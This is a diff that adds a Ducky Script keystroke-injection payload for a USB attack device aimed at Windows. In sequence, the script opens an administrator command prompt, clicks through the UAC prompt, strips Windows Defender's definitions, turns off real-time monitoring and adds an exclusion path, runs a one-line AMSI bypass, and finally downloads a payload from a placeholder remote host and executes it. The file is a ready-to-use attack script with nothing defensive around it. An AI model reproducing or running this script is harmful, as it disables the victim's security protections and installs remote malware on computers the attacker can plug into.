@@ -1,0 +1,42 @@
+DELAY 3000
+REM 3 second delay for device to register
+CTRL ESC
+REM keyboard shortcut for search bar
+DELAY 1700
+STRING cmd
+REM searching for cmd prompt
+DELAY 750
+CTRL SHIFT ENTER
+REM 'run as admin' keyboard shortcut
+DELAY 2500
+ALT y
+REM bypass UAC prompt
+DELAY 1500
+STRING cd %userprofile%
+ENTER
+DELAY 100
+STRING "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true
+REM Removes all security definitions for windows defender and disables AV protection (credit to Dan Tentler)
+ENTER
+DELAY 100
+STRING powershell
+ENTER
+DELAY 2500
+STRING Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath "<define exclusion path here>"
+REM Disables defender's 'real time monitoring' and sets exclusion path in event defender conducts a scan
+ENTER
+DELAY 100
+STRING "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+REM One line AMSI bypass (courtesy of Matt Graeber)
+ENTER
+DELAY 100
+STRING iex (New-Object System.Net.WebClient).DownloadFile('http://<ipaddr>/<payload>','<path\to\payload>');Start-Process .\"<path\to\payload>"\
+ENTER
+DELAY 100
+STRING exit
+ENTER
+REM Exiting Powershell
+DELAY 1000
+STRING exit
+ENTER
+REM End of Payload
